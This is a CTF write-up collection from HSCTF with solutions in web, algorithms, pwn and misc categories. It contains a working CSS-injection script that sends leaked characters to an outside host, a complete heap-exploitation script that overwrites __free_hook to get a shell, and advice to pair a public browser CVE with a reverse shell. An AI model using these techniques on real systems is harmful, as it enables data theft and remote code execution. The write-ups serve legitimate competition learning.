# web
## markdown-plus-plus
```python
import base64
from aiohttp import web
import asyncio
import string
import os
import requests

TARGET = "http://web1.hsctf.com:8002"
URL = "http://markdown-plus-plus-asdof.herokuapp.com"

async def css_injection():
	curr = "{"
	
	resp = asyncio.Queue()
	send_next = asyncio.Event()
	send_next.set()
	
	routes = web.RouteTableDef()
	
	@routes.get("/get/{name}")
	async def get(request):
		print(request.match_info)
		await resp.put(request.match_info["name"])
		return web.Response(body="")
	
	app = web.Application()
	app.add_routes(routes)
	runner = web.AppRunner(app)
	await runner.setup()
	site = web.TCPSite(runner, '0.0.0.0', int(os.getenv('PORT') or 8000))
	await site.start()
	
	try:
		while True:
			css = inject(curr)
			s = "[c=red}%s]" % css
			url = f"{TARGET}/display#{base64.b64encode(s.encode('utf-8')).decode()}"
			print(url)
			# requests.get(url)
			c = await resp.get()
			curr += c
			print(curr)
			send_next.set()
	finally:
		await runner.cleanup()

def inject(prefix):
	css = ""
	for c in string.ascii_lowercase + "{_}":
		css += f"[placeholder*='{prefix+c}']{{background:url(\"{URL}/get/{c}\")}}"
	return css

asyncio.run(css_injection())
```
# algorithms
## vending-machine-v2
###  Description
vending machine again ...?

`nc 35.204.95.14 1337`
[Vending Machine.pdf](dump/Vending%20Machine%20V2.pdf)
### Solve
ok for vending-machine-v2, the first observation was to notice that the coins were between 40000 and 50000, and the items were between 80000 and 200000, so only 2-4 coins are needed. (ok the case of 200000 could require 5 coins, but you probably didn't get this number). Now, we can use a simple greedy solution to discover the answer, randomizing the order of the list to retry, but this is pretty inefficient. An observation we can make (by trying to generate hack cases for greedy) is that the fewer coins required for an item, the more difficult it is to resolve. This inspires us to split up the items by coin count, randomize each sublist, then concatenate them for the final order (after trying the sorted list first of course). This randomization strategy results in most trials finishing within 5 tries, with some taking a bit longer.

```cpp
#include <bits/stdc++.h>

using namespace std;

int n = 56, m = 200;

pair<bool, vector<pair<int, vector<int> > > > check(vector<pair<int, int> > items, vector<int> coins){
	vector<bool> used(m);
	vector<pair<int, vector<int> > > sets;
	for(pair<int, int> itm : items){
		int x = itm.first;
		int best = INT_MAX;
		vector<int> pos;
		if(x < 120000){
			for(int i = 0; i < m; i ++){
				if(used[i]) continue;
				for(int j = i + 1; j < m; j ++){
					if(used[j]) continue;
					int test = coins[i] + coins[j];
					if(test >= x && test < best){
						best = test;
						pos = {i, j};
					}
				}
			}
			if(best == INT_MAX) return {false, sets};
			used[pos[0]] = used[pos[1]] = true;
		} else if(x < 160000){
			for(int i = 0; i < m; i ++){
				if(used[i]) continue;
				for(int j = i + 1; j < m; j ++){
					if(used[j]) continue;
					for(int k = j + 1; k < m; k ++){
						if(used[k]) continue;
						int test = coins[i] + coins[j] + coins[k];
						if(test >= x && test < best){
							best = test;
							pos = {i, j, k};
						}
					}
				}
			}
			if(best == INT_MAX) return {false, sets};
			used[pos[0]] = used[pos[1]] = used[pos[2]] = true;
		} else{
			for(int i = 0; i < m; i ++){
				if(used[i]) continue;
				for(int j = i + 1; j < m; j ++){
					if(used[j]) continue;
					for(int k = j + 1; k < m; k ++){
						if(used[k]) continue;
						for(int l = k + 1; l < m; l ++){
							if(used[l]) continue;
							int test = coins[i] + coins[j] + coins[k] + coins[l];
							if(test >= x && test < best){
								best = test;
								pos = {i, j, k, l};
							}
						}
					}
				}
			}
			if(best == INT_MAX) return {false, sets};
			used[pos[0]] = used[pos[1]] = used[pos[2]] = used[pos[3]] = true;
		}
		sets.push_back({itm.second, pos});
	}
	return {true, sets};
}

int main(){
	freopen("C:/ewang/C++/input.txt", "r", stdin);
	
	string s;
	cin >> s;
	vector<pair<int, int> > items(n);
	for(int i = 0; i < n; i ++){
		string s;
		cin >> s >> items[i].first;
		items[i].second = i + 1;
	}
	cin >> s;
	vector<int> coins(m);
	for(int i = 0; i < m; i ++){
		string s;
		cin >> s >> coins[i];
	}
	
	sort(items.begin(), items.end());
	vector<int> splits = {4, 16};
	pair<bool, vector<pair<int, vector<int> > > > q = check(items, coins);
	while(!q.first){
		cout << "retrying\n";
		random_shuffle(items.begin(), items.begin() + splits[0]);
		random_shuffle(items.begin() + splits[0], items.begin() + splits[1]);
		random_shuffle(items.begin() + splits[1], items.end());
		q = check(items, coins);
	}
	for(pair<int, vector<int> > p : q.second){
		cout << "Insert ";
		for(int x : p.second){
			cout << x + 1 << " ";
		}
		cout << endl;
		cout << "Buy " << p.first << endl;
	}
	
	return 0;
}
```
## Tunnels
https://github.com/xryuseix/CTF_Writeups/blob/master/HSCTF9/README.md //in japanese
# pwn
## queuestackarray
### Description
This is just the sort of needless complexity you have come to expect from your inventory management system.

-   Homestuck, page 970

`nc queuestackarray.hsctf.com 1337` running on Ubuntu 20.04
![](dump/queuestackarray.c)
![](dump/queuestackarray)
### Solve
```python
from pwn import *
import sys

libc = ELF("./libc.so.6")
elf = ELF("./queuestackarray")

if sys.argv[1] == "r":
    p = remote("queuestackarray.hsctf.com", 1337)
else:
    p = process("./queuestackarray_patched")
    # context.terminal = ["tmux", "splitw", "-h"]
    # gdb.attach(p, """
    # continue
    # heap bins
    # """)

def pushleft(num, content):
    p.sendlineafter("> ", "pushleft" + str(num) + " " + content)

def push(num, content):
    p.sendlineafter("> ", "push" + str(num) + " " + content)

def pop(num):
    p.sendlineafter("> ", "pop" + str(num))

def popright(num):
    p.sendlineafter("> ", "popright" + str(num))

def examine(num, idx):
    p.sendlineafter("> ", "examine" + str(num) + str(idx))

def solve():
    for i in range(6):
        push(3, str(i)*0x10)
    push(4, str(4)*0x10)

    for i in range(6):
        push(1, str(i)*0x10)
    
    for i in range(4):
        pushleft(2, str(i)*0x10)

    for i in range(6):
        pop(3)
    pop(4)

    # heap leak
    examine(3, 2)
    heap_leak = u64(p.recv(6) + "\x00\x00") - 0x3a0
    fake_unsorted = heap_leak + 0x590
    success("heap_leak: %s"%hex(heap_leak))
    

    # now tcache 0x20 is full, try to get double free in fastbin 0x20
    popright(2)
    for i in range(4):
        pop(1)
    pop(2)

    # assume we have a perfect fast bin (bruteforce required): victim -> another chunk -> victim (loop detected)
    # drain all chunk in tcache 0x20
    for i in range(6):
        push(3, str(i)*0x10)
    push(4, str(4)*0x10)

    # since tcache 0x20 is empty, if we allocate a chunk in fastbin, the rest will be taken to tcache 
    # allocate victim and overwrite to wanted address
    push(1, p64((fake_unsorted) | 0x69000000000000)) # because the last char will be replaced wil null byte => need a garbage value
    for i in range(6):
        pop(3)

    # put chunks 0x60 to craft a fake unsorted bin
    for i in range(6):
        push(3, "B" * 0x48)
    for i in range(3):
        push(4, "C" * 0x48)
    for i in range(4):
        push(2, "A" * 0x48)

    # put all in tcache 0x60
    for i in range(6):
        pop(3)
    for i in range(3):
        pop(4)

    # overwrite size of fake unsorted bin
    for i in range(3):
        pushleft(2, "A"*0x10)

    pushleft(3, "A"*0x10)
    pushleft(3, "A"*0x8 + p64(0x4a1 | 0x690000))

    popright(3)

    # leak libc
    p.sendlineafter("> ", "examine36")
    libc.address = u64(p.recv(6) + "\x00\x00") - 0x1ecbe0
    system = libc.symbols["system"]
    binsh = next(libc.search("/bin/sh"))
    freehook = libc.symbols["__free_hook"]
    success("libc: %s"%hex(libc.address))
    success("system: %s"%hex(system))
    success("freehook: %s"%hex(freehook))

    # now unsorted bin is overlap with tcache 0x60 chunks
    push(4, "a"*0x40)
    # pause()
    push(4, "b"*0x30 + p64((freehook - 0x42)| 0x69000000000000))

    # pause()
    for i in range(6):
        push(4, "A"*0x48)

    push(2, "A"*0x48)
    push(2, "A"*0x42 + p32(system & 0xffffffff) + p16(system >> 32))

    # from now just create a chunk (push 1/bin/sh) and free it several times (pop1) until pop shell

    p.interactive()

if __name__ == "__main__":
    solve()
```
# miscellaneous
## count-your-blessings-if-you-can
### Description
even a preschooler could solve this ~~math~~ computer science challenge. it's as easy as one, two, three, four, five, six, seven...

(Note: the PoW is 5 minutes long) nc count-your-blessings-if-you-can.hsctf.com 1337
### Solution
![](count-your-blessings-writeup_3.pdf)
### Solution 2
my real slow blessings rainbow table generator by recurrence
still asymmetrically faster than pure (n x n)(n x n) matrix mult though 
```python
import numpy as np

def recover_short(n, mat):
    mat2 = np.zeros((n, n), object)
    mat2[:,0] = mat
    for i in range(1, n):
        mat2[i:,i] = mat2[i-1:-1,i-1]-mat[i:]
    mat2[:-1,-1] = mat[1:]
    for i in range(n - 2, 0, -1):
        mat2[:i,i] = mat2[1:i+1,i+1]+mat[1:i+1]
    return mat2

def arrexp_short(n, mat, p):
    if p == 1:
        return np.array(mat)
    else:
        half = arrexp_short(n, mat, p >> 1)
        temp = np.matmul(recover_short(n, half), half) >> precisionbit
        if p & 1:
            temp = np.matmul(recover_short(n, temp), mat) >> precisionbit
        return temp

def fibo_short(n):
    mat = np.zeros((n,), object)
    mat[:2] = 1
    return mat * (1 << (precisionbit - 1))

def calc(n):
    global precisionbit
    precisionbit = (n << 1) + n
    # used just n << 1 during ctf
    # and there're still some of-by-1 errors for some entries
    precision = 1 << precisionbit
    left, right = 1 << n, (1 << n) + (1 << (n - 1))
    # ^ actually used a much smaller bound
    # , which is x[n] = 2 x[n - 1] + diff ± 3
    # (x[n] - 2^step x[n - step] + (diff ± 7) * ((1 << step) - 1)
    # for jumping)
    # , where diff = x[n - 1] - 2 x[n - 2]
    mark = (last << step) + diff * sc
    left, right = mark - 7 * sc, mark + 7 * sc
    
    init = left
    f = fibo_short(n)
    base = recover_short(n, arrexp_short(n, f, left))
    while left < right - 1:
        mid = (left + right) >> 1
        temp = np.matmul(base, arrexp_short(n, f, mid - init)) >> precisionbit
        if temp[0] << 2 >= precision:
            left = mid
        else:
            right = mid
    return left

last = 1421
diff = -1
step = 10
sc = ((1 << step) - 1)
from time import time
for i in range(10+step, 500, step):
    s = time()
    ans = calc(i)
    diff = (ans - (last << step)) // sc
    print(i, ans, time() - s)
    last = ans
```
# Unitended Solution
markdown-plus-plus/hsgtf unintended: [https://github.com/CrackerCat/CVE-2021-30632](https://github.com/CrackerCat/CVE-2021-30632 "https://github.com/CrackerCat/CVE-2021-30632")
1. replace the shellcode with your own linux revshell 
2. pwn the bot and steal both flags (kinda)

